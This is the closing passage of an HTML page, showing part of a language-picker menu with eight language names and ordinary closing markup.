              <div class="mi-language-picker__item" title="Lietuvių">Lietuvių</div>
              <div class="mi-language-picker__item" title="ગુજરાતી">ગુજરાતી</div>
              <div class="mi-language-picker__item" title="հայերեն">հայերեն</div>
              <div class="mi-language-picker__item" title="ਪੰਜਾਬੀ">ਪੰਜਾਬੀ</div>
              <div class="mi-language-picker__item" title="Hausa">Hausa</div>
              <div class="mi-language-picker__item" title="Қазақ тілі">Қазақ тілі</div>
              <div class="mi-language-picker__item" title="Azərbaycan">Azərbaycan</div>
              <div class="mi-language-picker__item" title="ଓଡ଼ିଆ">ଓଡ଼ିଆ</div>
            </div>
          </div>
        </div>
      </div>
      <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
    </div>
  </body>
</html>